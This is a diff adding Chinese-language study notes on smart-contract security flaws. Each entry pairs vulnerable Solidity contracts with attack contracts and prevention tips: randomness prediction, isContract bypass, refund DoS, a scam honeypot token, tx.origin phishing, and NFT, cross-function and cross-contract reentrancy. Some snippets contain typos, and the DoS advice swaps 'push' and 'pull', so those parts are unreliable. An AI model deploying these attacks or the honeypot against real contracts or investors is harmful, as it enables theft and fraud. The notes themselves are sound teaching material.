@@ -2926,22 +2926,578 @@ import '@openzeppelin/contracts/access/Ownable.sol';
 
 ### 2024.10.14
 
-- [104-S07] 坏随机数
+- [104-S07] 坏随机数（Bad Randomness）
+    - 由于以太坊上所有数据都是公开透明（public）且确定性（deterministic）的，它没有其他编程语言一样给开发者提供生成随机数的方法，例如random()。很多项目方不得不使用链上的伪随机数生成方法，例如 blockhash() 和 keccak256() 方法。
+    - 漏洞例子:
+    ```solidity
+    contract BadRandomness is ERC721 {
+        uint256 totalSupply;
+        constructor() ERC721("", ""){}
+        // 铸造函数：当输入的 luckyNumber 等于随机数时才能mint
+        function luckyMint(uint256 luckyNumber) external {
+            uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number
+            require(randomNumber == luckyNumber, "Better luck next time!");
+            _mint(msg.sender, totalSupply); // mint
+            totalSupply++;
+        }
+    }
+    contract Attack {
+        function attackMint(BadRandomness nftAddr) external {
+            // 提前计算随机数
+            uint256 luckyNumber = uint256(
+                keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
+            ) % 100;
+            // 利用 luckyNumber 攻击
+            nftAddr.luckyMint(luckyNumber);
+        }
+    }
+    ```
+    - 预防方法：使用预言机项目提供的链下随机数来预防这类漏洞，例如 Chainlink VRF。
 - [104-S08] 绕过合约检查
-- [104-S09] 拒绝服务
+    - 很多 freemint 的项目为了限制科学家（程序员）会用到 isContract() 方法，希望将调用者 msg.sender 限制为外部账户（EOA），而非合约。这个函数利用 extcodesize 获取该地址所存储的 bytecode 长度（runtime），若大于0，则判断为合约，否则就是EOA（用户）。
+    - 在合约在被创建的时候，runtime bytecode 还没有被存储到地址上，因此 bytecode 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 constructor 中的话，就可以绕过 isContract() 检查。
+    - 漏洞例子：
+    ```solidity
+    contract ContractCheck is ERC20 {
+        constructor() ERC20("", "") {}        
+        function isContract(address account) public view returns (bool) {
+            // extcodesize > 0 的地址一定是合约地址, 但是合约在构造函数时候 extcodesize 为0
+            uint size;
+            assembly {
+                size := extcodesize(account)
+            }
+            return size > 0;
+        }
 
+        function mint() public {
+            require(!isContract(msg.sender), "Contract not allowed!"); // mint函数，只有非合约地址能调用（有漏洞）
+            _mint(msg.sender, 100);
+        }
+    }
+
+    // 利用构造函数的特点攻击
+    contract NotContract {
+        bool public isContract;
+        address public contractCheck;
+
+        // 当合约正在被创建时，extcodesize (代码长度) 为 0，因此不会被 isContract() 检测出。
+        constructor(address addr) {
+            contractCheck = addr;
+            isContract = ContractCheck(addr).isContract(address(this));
+            // This will work
+            for(uint i; i < 10; i++){
+                ContractCheck(addr).mint();
+            }
+        }
+
+        // 合约创建好以后，extcodesize > 0，isContract() 可以检测
+        function mint() external {
+            ContractCheck(contractCheck).mint();
+        }
+    }
+    ```
+    - 解决办法：使用 (tx.origin == msg.sender) 来检测调用者是否为合约。如果调用者为 EOA，那么tx.origin和msg.sender相等；如果它们俩不相等，调用者为合约。
+- [104-S09] 拒绝服务（Denial of Service, DoS）
+    - 漏洞例子：游戏开始时，玩家们调用 deposit() 函数往合约里存款，合约会记录下所有玩家地址和相应的存款；当游戏结束时，refund()函数被调用，将 ETH 依次退款给所有玩家。
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity ^0.8.21;
+    contract DoSGame {     // 有DoS漏洞的游戏，玩家们先存钱，游戏结束后，调用refund退钱。
+        bool public refundFinished;
+        mapping(address => uint256) public balanceOf;
+        address[] public players;
+
+        function deposit() external payable {
+            require(!refundFinished, "Game Over");
+            require(msg.value > 0, "Please donate ETH");
+            balanceOf[msg.sender] = msg.value;
+            players.push(msg.sender);
+        }
+
+        function refund() external {
+            require(!refundFinished, "Game Over");
+            uint256 pLength = players.length;
+            for(uint256 i; i < pLength; i++){
+                address player = players[i];
+                uint256 refundETH = balanceOf[player];
+                (bool success, ) = player.call{value: refundETH}(""); // 如果目标地址为一个恶意合约，在回调函数中加入了恶意逻辑，退款将不能正常进行
+                require(success, "Refund Fail!");
+                balanceOf[player] = 0;
+            }
+            refundFinished = true;
+        }
+
+        function balance() external view returns(uint256){
+            return address(this).balance;
+        }
+    }
+
+    contract Attack {
+        fallback() external payable{
+            revert("DoS Attack!");
+        }
+        function attack(address gameAddr) external payable {
+            DoSGame dos = DoSGame(gameAddr);
+            dos.deposit{value: msg.value}();
+        }
+    }
+    ```
+    - 缓解措施：
+        - 外部合约的函数调用（例如 call）失败时不会使得重要功能卡死，比如将上面漏洞合约中的 require(success, "Refund Fail!"); 去掉，退款在单个地址失败时仍能继续运行。
+        - 合约不会出乎意料的自毁。
+        - 合约不会进入无限循环。
+        - require 和 assert 的参数设定正确。
+        - 退款时，让用户从合约自行领取（push），而非批量发送给用户(pull)。
+        - 确保回调函数不会影响正常合约运行。
+        - 确保当合约的参与者（例如 owner）永远缺席时，合约的主要业务仍能顺利运行。
+
+<!-- Content_END -->
 ### 2024.10.15
 
-- [104-S10] 貔貅
-- [104-S11] 抢先交易
-- [104-S12] tx.origin 钓鱼攻击
+- [104-S10] 貔貅合约(蜜罐代币 honeypot token)
+    - 貔貅盘的特点：投资人只能买不能卖，仅有项目方地址能卖出。
+        - 恶意项目方部署貔貅代币合约。
+        - 宣传貔貅代币让散户上车，由于只能买不能卖，代币价格会一路走高。
+        - 项目方rug pull卷走资金。
+    ```solidity
+    contract HoneyPot is ERC20, Ownable { // 只能买，不能卖
+        address public pair;
+        constructor() ERC20("HoneyPot", "Pi Xiu") {
+            address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // goerli uniswap v2 factory
+            address tokenA = address(this); // 貔貅代币地址
+            address tokenB = 0xB4FBF271143F4FBf7B91A5ded31805e42b2208d6; //  goerli WETH
+            (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序
+            bytes32 salt = keccak256(abi.encodePacked(token0, token1));
+            // calculate pair address
+            pair = address(uint160(uint(keccak256(abi.encodePacked(
+            hex'ff',
+            factory,
+            salt,
+            hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f'
+            )))));
+        }
 
+        function mint(address to, uint amount) public onlyOwner {
+            _mint(to, amount);
+        }
+
+        function _update(address from,address to,uint256 amount) internal virtual override {
+            if(to == pair){
+                require(from == owner(), "Can not Transfer"); // 只有 owner 才能卖币
+            }
+            super._update(from, to, amount);
+        }
+    }
+    ```
+    - 为了绕过相关的貔貅检查，有些貔貅合约还进行了一系列的伪装：
+        - 譬如对于非特权用户的转账，不会进行回滚，而是保持状态不变，表面上显示交易成功，实际上依旧没有实现用户的真实交易意图。
+        - 伪造错误的事件，通过emit不存在的事件误导正在监听事件的钱包和浏览器，使其进行错误的显示，从而使用户产生错误的判断。
+    - 预防方法：
+        - 在区块链浏览器上（比如etherscan）查看合约是否开源，如果开源，则分析它的代码，看是否有貔貅漏洞。
+        - 使用貔貅识别工具，比如 [Token Sniffer](https://tokensniffer.com/) 和 [Ave Check](https://ave.ai/check)，分低的话大概率是貔貅。
+        - 看项目是否有审计报告。
+        - 使用tenderly、phalcon分叉模拟卖出貔貅，如果失败则确定是貔貅代币。
+- [104-S11] 抢先交易/抢跑(front-running)
+    - 链上抢跑指的是搜索者或矿工通过调高gas或其他方法将自己的交易安插在其他交易之前，来攫取价值。在区块链中，矿工可以通过打包、排除或重新排序他们产生的区块中的交易来获得一定的利润，而MEV是衡量这种利润的指标。在用户的交易被矿工打包进以太坊区块链之前，大部分交易会汇集到Mempool（交易内存池）中，矿工在这里寻找费用高的交易优先打包出块，实现利益最大化。通常来说，gas price越高的交易，越容易被打包。同时，一些MEV机器人也会搜索mempool中有利可图的交易。比如，一笔在去中心化交易所中滑点设置过高的swap交易可能会被三明治攻击：通过调整gas，套利者会在这笔交易之前插一个买单，再在之后发送一个卖单，并从中盈利。这等效于哄抬市价。
+- [104-S12] tx.origin 钓鱼攻击
+    - 如果一个银行合约使用了tx.origin做身份认证，那么黑客就有可能先部署一个攻击合约，然后再诱导银行合约的拥有者调用，即使msg.sender是攻击合约地址，但tx.origin是银行合约拥有者地址，那么转账就有可能成功。
+    ```solidity
+    contract Bank {
+        address public owner;//记录合约的拥有者
+
+        constructor() payable {
+            owner = msg.sender;
+        }
+
+        function transfer(address payable _to, uint _amount) public 
+            require(tx.origin == owner, "Not owner"); // tx.origin 可能被钓鱼！
+            (bool sent, ) = _to.call{value: _amount}("");
+            require(sent, "Failed to send Ether");
+        }
+    }
+
+    contract Attack {
+        address payable public hacker;
+        Bank bank;
+        constructor(Bank _bank) {
+            bank = Bank(_bank);
+            hacker = payable(msg.sender);
+        }
+
+        function attack() public {
+            //诱导bank合约的owner调用，于是bank合约内的余额就全部转移到黑客地址中
+            bank.transfer(hacker, address(bank).balance);
+        }
+    }
+    ```
+    - 预防措施：
+        - 使用msg.sender代替tx.origin；
+        - 如果一定要使用tx.origin，检验tx.origin == msg.sender；
 ### 2024.10.16
 
 - [104-S13] 未检查的低级调用
-- [104-S14] 操纵区块时间
-- [104-S15] 操纵预言机
-- [104-S16] NFT重入攻击
-- [104-S17] “跨服”重入攻击
+    - 失败的低级调用不会让交易回滚，如果合约中忘记对其返回值进行检查，往往会出现严重的问题。以太坊的低级调用包括 call()，delegatecall()，staticcall()，和send()。这些函数与 Solidity 其他函数不同，当出现异常时，它并不会向上层传递，也不会导致交易完全回滚；它只会返回一个布尔值 false ，传递调用失败的信息。如果未检查低级函数调用的返回值，则无论低级调用失败与否，上层函数的代码会继续运行。
+    - 最容易出错的是send()：一些合约使用 send() 发送 ETH，但是 send() 限制 gas 要低于 2300，否则会失败。当目标地址的回调函数比较复杂时，花费的 gas 将高于 2300，从而导致 send() 失败。如果此时在上层函数没有检查返回值的话，交易继续执行，就会出现意想不到的问题。 [example](https://www.kingoftheether.com/postmortem.html)
+    ```solidity
+    contract UncheckedBank {
+        mapping (address => uint256) public balanceOf;
 
-<!-- Content_END -->
+        function deposit() external payable {
+            balanceOf[msg.sender] += msg.value;
+        }
+
+        function withdraw() external {
+            uint256 balance = balanceOf[msg.sender];
+            require(balance > 0, "Insufficient balance");
+            balanceOf[msg.sender] = 0;
+            // Unchecked low-level call
+            bool success = payable(msg.sender).send(balance); // 这个函数没有检查 send() 的返回值，提款失败但余额会清零
+        }
+
+        function getBalance() external view returns (uint256) {
+            return address(this).balance;
+        }
+    }
+    ```
+    - 使用以下几种方法来预防未检查低级调用的漏洞:
+        - 检查低级调用的返回值；
+        - 使用OpenZeppelin的[Address](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol)库，封装了低级调用检查返回值功能；
+- [104-S14] 操纵区块时间
+    - 在 The Merge 之前，以太坊矿工可以操纵区块时间，如果抽奖合约的伪随机数依赖于区块时间，则可能被攻击。区块时间（block timestamp）是包含在以太坊区块头中的一个 uint64 值，代表此区块创建的 UTC 时间戳（单位：秒），在合并（The Merge）之前，以太坊会根据算力调整区块难度，因此出块时间不定，平均 14.5s 出一个区块，矿工可以操纵区块时间；合并之后，改为固定 12s 一个区块，验证节点不能操纵区块时间。
+    - [Foundry 教程](https://github.com/AmazingAng/WTF-Solidity/blob/main/Topics/Tools/TOOL07_Foundry/readme.md) | [Foundry book](https://book.getfoundry.sh/forge/cheatcodes)
+    - 例子：
+    ```solidity
+    contract TimeManipulation is ERC721 {
+        uint256 totalSupply;
+        constructor() ERC721("", ""){}
+        // 铸造函数：当区块时间能被7整除时才能mint成功
+        function luckyMint() external returns(bool success){
+            if(block.timestamp % 170 == 0){
+                _mint(msg.sender, totalSupply); // mint
+                totalSupply++;
+                success = true;
+            }else{
+                success = false;
+            }
+        }
+    }
+    ```
+    - 选择 Foundry 来复现这个攻击，因为它提供了修改区块时间的作弊码（cheatcodes）。
+    ```solidity
+    // SPDX-License-Identifier: UNLICENSED
+    pragma solidity ^0.8.21;
+    import "forge-std/Test.sol";
+    import "forge-std/console.sol";
+    import "../src/TimeManipulation.sol";
+
+    contract TimeManipulationTest is Test {
+        TimeManipulation public nft;
+
+        // Computes address for a given private key
+        address alice = vm.addr(1);
+
+        function setUp() public {
+            nft = new TimeManipulation();
+        }
+
+        // forge test -vv --match-test  testMint
+        function testMint() public {
+            console.log("Condition 1: block.timestamp % 170 != 0");
+            // Set block.timestamp to 169
+            vm.warp(169);
+            console.log("block.timestamp: %s", block.timestamp);
+            // Sets all subsequent calls' msg.sender to be the input address
+            // until `stopPrank` is called
+            vm.startPrank(alice);
+            console.log("alice balance before mint: %s", nft.balanceOf(alice));
+            nft.luckyMint();
+            console.log("alice balance after mint: %s", nft.balanceOf(alice));
+
+            // Set block.timestamp to 17000
+            console.log("Condition 2: block.timestamp % 170 == 0");
+            vm.warp(17000);
+            console.log("block.timestamp: %s", block.timestamp);
+            console.log("alice balance before mint: %s", nft.balanceOf(alice));
+            nft.luckyMint();
+            console.log("alice balance after mint: %s", nft.balanceOf(alice));
+            vm.stopPrank();
+        }
+    }
+    ```
+    ```bash
+    forge init TimeManipulation
+    cd TimeManipulation
+    forge install Openzeppelin/openzeppelin-contracts
+
+    forge test -vv --match-test testMint
+    ```
+- [104-S15] 操纵预言机
+    - 出于安全性的考虑，以太坊虚拟机（EVM）是一个封闭孤立的沙盒。在EVM上运行的智能合约可以接触链上信息，但无法主动和外界沟通获取链下信息。预言机（oracle）从链下数据源获得信息，并将其添加到链上，供智能合约使用。其中最常用的就是价格预言机（price oracle）,去中心借贷平台（AAVE）使用它来确定借款人是否已达到清算阈值, 合成资产平台（Synthetix）使用它来确定资产最新价格，并支持 0 滑点交易,MakerDAO使用它来确定抵押品的价格，并铸造相应的稳定币 $DAI。如果预言机没有被开发者正确使用，会造成很大的安全隐患。
+    - 例子：oUSD 合约。该合约是一个稳定币合约，符合ERC20标准。类似合成资产平台Synthetix，用户可以在这个合约中零滑点的将 ETH 兑换为 oUSD（Oracle USD）。兑换价格由自定义的价格预言机（getPrice()函数）决定，这里采取的是Uniswap V2的 WETH-BUSD 的瞬时价格。在之后的攻击示例中，我们会看到这个预言机在使用闪电贷和大额资金的情况下非常容易被操纵。
+- [104-S16] NFT重入攻击
+    - 转账NFT时并不会触发合约的fallback或receive函数，为什么会有重入风险呢？这是因为NFT标准（ERC721/ERC1155）为了防止用户误把资产转入黑洞而加入了安全转账：如果转入地址为合约，则会调用该地址相应的检查函数，确保它已准备好接收NFT资产。例如 ERC721 的 safeTransferFrom() 函数会调用目标地址的 onERC721Received() 函数，而黑客可以把恶意代码嵌入其中进行攻击。
+    - 漏洞：
+        - ERC721
+            - safeTransferFrom
+            - _safeTransfer
+            - _safeMint
+            - _checkOnERC721Received
+        - ERC1155
+            - safeTransferFrom
+            - _safeTransferFrom
+            - safeBatchTransferFrom
+            - _safeBatchTransferFrom
+            - _mint
+            - _mintBatch
+            - _doSafeTransferAcceptanceCheck
+            - _doSafeBatchTransferAcceptanceCheck
+    - 漏洞例子：ERC721合约，每个地址可以免费铸造一个NFT，但是我们通过重入攻击可以一次铸造多个。
+    ```solidity
+    contract NFTReentrancy is ERC721 {
+        uint256 public totalSupply;
+        mapping(address => bool) public mintedAddress;
+        constructor() ERC721("Reentry NFT", "ReNFT"){}
+
+        // 铸造函数，每个用户只能铸造1个NFT
+        function mint() payable external {
+            require(mintedAddress[msg.sender] == false);
+            totalSupply++;
+            _safeMint(msg.sender, totalSupply); // 有重入漏洞
+            mintedAddress[msg.sender] = true;
+        }
+    }
+
+    contract Attack is IERC721Receiver{
+        NFTReentrancy public nft;
+
+        constructor(NFTReentrancy _nftAddr) {
+            nft = _nftAddr;
+        }
+        
+        function attack() external {
+            nft.mint();
+        }
+
+        // ERC721的回调函数，会重复调用mint函数，铸造10个
+        function onERC721Received(address, address, uint256, bytes memory) public virtual override returns (bytes4) {
+            if(nft.balanceOf(address(this)) < 10){
+                nft.mint();
+            }
+            return this.onERC721Received.selector;
+        }
+    }
+    ```
+    - 解决方法：检查-影响-交互模式（checks-effect-interaction）和重入锁 [ReentrancyGuard.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/ReentrancyGuard.sol)
+- [104-S17] “跨服”重入攻击
+    - 生产环境中的例子，“跨服”是一个概括，从某一个函数开始入手，但是攻击对象却是其他函数/合约/项目等等。
+    - 跨函数重入攻击
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity 0.8.17;
+
+    contract VulnerableBank {
+        mapping(address => uint256) public balances;
+
+        uint256 private _status;  // 重入锁
+        modifier nonReentrant() { // 重入锁
+            require(_status == 0, "ReentrancyGuard: reentrant call");
+            _status = 1;
+            _;
+            _status = 0;
+        }
+
+        function deposit() external payable {
+            require(msg.value > 0, "Deposit amount must ba greater than 0");
+            balances[msg.sender] += msg.value;
+        }
+
+        function withdraw(uint256 _amount) external nonReentrant {
+            uint256 balance = balances[msg.sender];
+            require(balance >= _amount, "Insufficient balance");
+
+            (bool success, ) = msg.sender.call{value: _amount}("");
+            require(success, "Withdraw failed");
+
+            balances[msg.sender] = balance - _amount;
+        }
+
+        function transfer(address _to, uint256 _amount) external {
+            uint256 balance = balances[msg.sender];
+            require(balance >= _amount, "Insufficient balance");
+
+            balances[msg.sender] -= _amount;
+            balances[_to] += _amount;
+        }
+    }
+    ```
+    - 攻击示例：
+    ```solidity
+    // SPDX-License-Identifier: MIT
+    pragma solidity 0.8.17;
+    import "../IVault.sol";
+    contract Attack2Contract {
+        address victim;
+        address owner;
+
+        constructor(address _victim, address _owner) {
+            victim = _victim;
+            owner = _owner;
+        }
+
+        function deposit() external payable {
+            IVault(victim).deposit{value: msg.value}("");
+        }
+
+        function withdraw() external {
+            Ivault(victim).withdraw();
+        }
+
+        receive() external payable {
+            uint256 balance = Ivault(victim).balances[address(this)];
+            Ivault(victim).transfer(owner, balance);
+        }
+    }
+    ```
+    - 分析：这里的 transfer 里没有加锁，导致跨函数重入。
+    - 进阶案例：如果改进一下， 将合约中的所有跟资产转移沾边的函数都加上重入锁，那是不是就安全了呢？
+    - 跨合约重入攻击
+    案例：第一个合约是TwoStepSwapManager, 它是面向用户的合约，里面包含有允许用户直接发起的提交一个swap交易的函数，还有同样是可由用户发起的，用来取消正在等待执行但尚未执行的swap交易的函数；第二个合约是TwoStepSwapExecutor, 它是只能由管理的角色来发起的交易，用于执行某个处于等待中的swap交易。
+    ```solidity
+    // 合约一：
+    contract TwoStepSwapManager {
+        struct Swap {
+            address user;
+            uint256 amount;
+            address[] swapPath;
+            bool unwrapnativeToken;
+        }
+
+        uint256 swapNonce;
+        mapping(uint256 => Swap) pendingSwaps;
+
+        uint256 private _status;
+        modifier nonReentrant() {
+            require(_status == 0, "ReentrancyGuard: reentrant call");
+            _status = 1;
+            _;        // 调用结束，将 _status 恢复为0
+            _status = 0;
+        }
+
+        function createSwap(uint256 _amount, address[] _swapPath, bool _unwrapnativeToken) external nonReentrant {
+            IERC20(swapPath[0]).safeTransferFrom(msg.sender, _amount);
+            pendingSwaps[++swapNounce] = Swap({
+                user: msg.sender,
+                amount: _amount,
+                swapPath: _swapPath,
+                unwrapNativeToken: _unwrapNativeToken
+            });
+        }
+
+        function cancelSwap(uint256 _id) external nonReentrant {
+            Swap memory swap = pendingSwaps[_id];
+            require(swap.user == msg.sender);
+            delete pendingSwaps[_id];
+
+            IERC20(swapPath[0]).safeTransfer(swap.user, swap.amount);
+        }
+    }
+    // 合约二：
+    pragma solidity 0.8.17;
+    contract TwoStepSwapExecutor {
+        uint256 private _status; // 重入锁
+
+        // 略
+
+        modifier nonReentrant() {
+            require(_status == 0, "ReentrancyGuard: reentrant call");
+            _status = 1;
+            _;
+            _status = 0;
+        }
+
+        function executeSwap(uint256 _id) external onlySwapExecutor nonReentrant {
+            Swap memory swap = ISwapManager(swapManager).pendingSwaps(_id);
+
+            // If a swapPath ends in WETH and unwrapNativeToken == true, send ether to the user
+            ISwapManager(swapManager).swap(swap.user, swap.amount, swap.swapPath, swap.unwrapNativeToken);
+            ISwapManager(swapManager).delete(pendingSwaps[_id]);
+        }
+    }
+    ```
+    - 漏洞：这两个合约锁的状态是不互通的，当运行到 swap() 的时候，发起 ETH 转账，将执行权交给了攻击者的恶意合约的 fallback 函数，在那里被设置了对 TwoStepSwapManager 合约的 cancelSwap 函数的调用，而此时这个合约的重入锁还是0，所以cancelSwap开始执行，攻击者收到了 executeSwap 发送给他的 swap 过来的 ETH，同时还收到了 cancelSwap 退给他的当初送出去用来 swap 的本金。
+    - 防范措施：全局重入锁，建立一个单独的合约用来储存重入状态，然后在系统里的任何合约里相关的函数在执行的时候，都要来这同一个地方来查看当前的重入状态。
+    ```solidity
+    pragma solidity ^0.8.0;
+    import "../data/Keys.sol";
+    import "../data/DataStore.sol";
+    abstract contract GlobalReentrancyGuard{
+        uint256 private constant NOT_ENTERED = 0;
+        uint256 private constant ENTERED = 1;
+
+        DataStore public immutable dataStore;
+
+        constructor(DataStore _datastore) {
+            dataStore = _dataStore;
+        }
+
+        modifier globalNonReentrant() {
+            _nonReentrantBefore();
+            _;
+            _nonReentrantAfter();
+        }
+
+        function _nonReentrantBefore() private {
+            uint256 status = dataStore.getUint(Keys.REENTRANCY_GUARD_STATUS);
+
+            require(status == NOT_ENTERED, "ReentrancyGuard: reentrant call");
+
+            dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, ENTERED);
+        }
+
+        function _nonReentrantAfter() private {
+            dataStore.setUint(Keys.REENTRANCY_GUARD_STATUS, NOT_ENTERED);
+        }
+    }
+    ```
+    - 跨项目重入攻击（只读重入攻击 Read-Only Reentrancy）
+    ```solidity
+    pragma solidity 0.8.17;
+
+    contract VulnerableBank {
+        mapping(address => uint256) public balances;
+
+        uint256 private _status; // 重入锁
+        modifier nonReentrant() {
+            require(_status == 0, "ReentrancyGuard: reentrant call");
+            _status = 1;
+            _;
+            _status = 0;
+        }
+
+        function deposit() external payable {
+            require(msg.value > 0, "Deposit amount must ba greater than 0");
+            balances[msg.sender] += msg.value;
+        }
+
+        function withdraw(uint256 _amount) external nonReentrant {
+            require(_amount > 0, "Withdrawal amount must be greater than 0");
+            require(isAllowedToWithdraw(msg.sender, _amount), "Insufficient balance");
+
+            (bool success, ) = msg.sender.call{value: _amount}("");
+            require(success, "Withdraw failed");
+
+            balances[msg.sender] -= _amount;
+        }
+
+        function isAllowedToWithdraw(address _user, uint256 _amount) public view returns(bool) { // 漏洞点：利用重入信息更新滞后攻击依赖这个作为判断的其他项目
+            return balances[_user] >= _amount;
+        }
+    }
+    ```
+    - ERC721 & ERC777 Reentrancy
+    ```solidity
+    // ERC721
+    function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes memory _data) public returns(bytes4);
+    // ERC777
+    function tokensReceived(address _operator, address _from, address _to, uint256 _amount, bytes calldata _userData, bytes calldata _operatorData) external;
+    ```
